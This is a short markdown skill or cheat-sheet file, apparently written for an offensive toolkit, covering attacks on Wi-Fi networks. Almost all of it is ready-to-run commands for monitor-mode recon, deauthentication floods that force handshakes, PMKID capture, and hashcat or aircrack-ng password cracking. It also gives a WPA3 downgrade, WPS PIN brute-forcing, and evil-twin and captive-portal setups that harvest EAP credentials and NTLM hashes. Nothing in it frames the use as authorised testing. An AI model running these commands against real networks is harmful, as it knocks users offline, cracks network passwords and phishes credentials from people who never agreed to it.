---
name: wireless
description: Wi-Fi recon, handshakes, PMKID, WPA3, evil twin.
tags: [wifi, wpa, handshake, rf]
---
# Wireless

## Setup
- `iw dev`, `ip link set wlan0 down`, `iw wlan0 set monitor control`, `ip link set wlan0 up`.
- `airmon-ng check kill; airmon-ng start wlan0` (creates wlan0mon).
- `iw reg set IN` for correct channels and power.

## Recon
- `airodump-ng wlan0mon` — BSSID, channel, encryption, clients.
- Target: `airodump-ng -c $CH --bssid $BSSID -w cap wlan0mon`.

## Capture
- Deauth to force a handshake: `aireplay-ng -0 5 -a $BSSID -c $CLIENT wlan0mon`.
- PMKID (no client needed): `hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1`, then `hcxpcapngtool -o hash.hc22000 pmkid.pcapng`.
- Crack: `hashcat -m 22000 hash.hc22000 rockyou.txt` (handshake and PMKID are both hc22000).
- `aircrack-ng -w rockyou.txt cap-01.cap` as fallback.

## WPA3 / WPS
- WPA3 SAE: capture 4-way + SAE commit; `hashcat -m 22000` supports SAE. Transition mode can be downgraded.
- WPS: `wash -i wlan0mon`, `reaver -i wlan0mon -b $BSSID -vv` (pixie dust `-K 1`).

## Evil twin
- `eaphammer --bssid $BSSID --essid "$SSID" --channel $CH --auth wpa-eap --capture-ntlm`
- `hostapd-wpe` for EAP creds; `wifiphisher` for a captive portal.
- Karma attack: respond to all probe requests.

## Hidden knowledge
- 5 GHz hides SSIDs you cannot see on 2.4; scan both (`airodump-ng --band abg`).
- A hidden SSID is revealed by any client probe or association.
- `aireplay-ng -0 0` is continuous deauth; too many drops clients off 5 GHz.
- Handshake quality matters: `aircrack-ng` says "no handshake" if EAPOL frames are incomplete — recapture.
- Check for WPS locked/PIN-less APs before brute-forcing for 8 hours.
